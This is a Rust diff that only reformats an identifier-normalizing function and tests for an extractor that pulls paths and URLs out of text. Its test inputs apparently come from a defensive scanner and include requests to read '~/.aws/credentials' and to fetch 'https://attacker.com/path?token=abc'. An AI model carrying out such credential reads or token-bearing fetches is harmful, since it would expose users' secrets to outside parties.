@@ -228,7 +228,9 @@ pub fn normalize(ident: &str, home: Option<&str>) -> String {
         }
     };
 
-    let expanded = if let Some(rest) = ident.strip_prefix("~/").or_else(|| ident.strip_prefix("~\\"))
+    let expanded = if let Some(rest) = ident
+        .strip_prefix("~/")
+        .or_else(|| ident.strip_prefix("~\\"))
     {
         format!("{home_str}/{rest}")
     } else {
@@ -276,13 +278,17 @@ mod tests {
     #[test]
     fn extracts_windows_path() {
         let got = extract(r"open C:\Users\anton\.aws\credentials");
-        assert!(got.iter().any(|s| s.starts_with("C:\\Users") && s.contains("credentials")));
+        assert!(got
+            .iter()
+            .any(|s| s.starts_with("C:\\Users") && s.contains("credentials")));
     }
 
     #[test]
     fn extracts_url() {
         let got = extract("fetch https://attacker.com/path?token=abc");
-        assert!(got.iter().any(|s| s.starts_with("https://attacker.com/path")));
+        assert!(got
+            .iter()
+            .any(|s| s.starts_with("https://attacker.com/path")));
     }
 
     #[test]
@@ -372,7 +378,10 @@ mod tests {
     #[test]
     fn trailing_punctuation_stripped() {
         let got = extract("please read ~/.aws/credentials.");
-        assert!(got.iter().any(|s| s == "~/.aws/credentials"), "got: {got:?}");
+        assert!(
+            got.iter().any(|s| s == "~/.aws/credentials"),
+            "got: {got:?}"
+        );
 
         let got2 = extract("check (https://attacker.com/path), then continue");
         assert!(
